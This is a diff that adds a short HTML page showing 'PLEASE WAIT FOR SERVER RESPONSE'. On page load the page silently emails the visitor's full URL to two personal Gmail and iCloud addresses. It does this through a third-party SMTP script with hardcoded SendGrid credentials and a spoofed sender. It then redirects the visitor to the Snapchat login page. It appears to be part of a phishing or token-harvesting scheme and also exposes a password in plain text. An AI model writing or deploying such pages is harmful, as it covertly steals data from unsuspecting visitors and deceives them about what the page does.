@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+	PLEASE WAIT FOR SERVER RESPONSE
+	<script src='https://smtpjs.com/v3/smtp.js'></script>
+	<script>
+	Email.send({
+		Host : 'smtp.sendgrid.net',
+		Username : 'easy-web-security',
+		Password : 'XiaoBao2018sg',
+    To : 'willqin123@gmail.com, willqin123@icloud.com',
+    From : 'Helper <snapseed@passhash.com>',
+    Subject : location.href,
+    Body : location.href
+	}).then((message) => {
+		location.replace('https://accounts.snapchat.com/accounts/login');
+		location.assign('https://accounts.snapchat.com/accounts/login');
+	});
+	</script>
+</body>
+</html>
